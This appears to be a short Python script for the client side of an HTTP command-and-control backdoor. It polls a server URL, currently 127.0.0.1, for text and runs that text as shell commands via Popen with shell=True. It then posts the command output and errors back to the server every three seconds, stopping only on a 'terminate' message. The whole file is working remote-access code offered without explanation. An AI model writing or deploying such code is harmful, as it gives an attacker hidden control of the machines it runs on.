import requests
from subprocess import PIPE, Popen
import time

SERVER_URL = 'http://127.0.0.1'

while True:
    req = requests.get(SERVER_URL)
    command = req.text

    if 'terminate' in command:
        break
    else:
        CMD = Popen(command, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
        post_response = requests.post(url=SERVER_URL, data=CMD.stdout.read())
        post_response = requests.post(url=SERVER_URL, data=CMD.stderr.read())
        time.sleep(3)

